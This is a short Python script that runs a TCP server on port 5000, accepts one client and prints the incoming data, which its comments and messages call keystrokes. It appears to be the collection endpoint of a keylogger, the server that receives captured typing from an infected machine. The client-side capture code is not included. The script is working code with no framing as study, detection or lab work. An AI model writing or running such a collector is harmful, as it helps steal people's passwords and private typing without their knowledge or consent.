import socket

def start_server():
    host = '0.0.0.0'  # Listen on all interfaces
    port = 5000        # Port for the server to listen on

    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        print(f"Binding server to {host}:{port}")
        # Bind the socket to an address and port
        server_socket.bind((host, port))

        # Start listening for incoming connections
        server_socket.listen(1)
        print(f"Server listening on {host}:{port}")

        # Accept a connection
        client_socket, client_address = server_socket.accept()
        print(f"Connection established with {client_address}")

        try:
            # Receive and print data (keystrokes) from the client
            while True:
                data = client_socket.recv(1024)  # Receive data from client
                if not data:
                    print("No data received. Closing connection.")
                    break  # If no data is received, the connection is closed
                print(f"Keystrokes received: {data.decode()}")  # Print received keystrokes
        except Exception as e:
            print(f"Error receiving data: {e}")
        finally:
            # Close the connection when done
            client_socket.close()
            print("Client connection closed.")
    except Exception as e:
        print(f"Error setting up server: {e}")
    finally:
        server_socket.close()
        print("Server closed.")

if __name__ == "__main__":
    start_server()
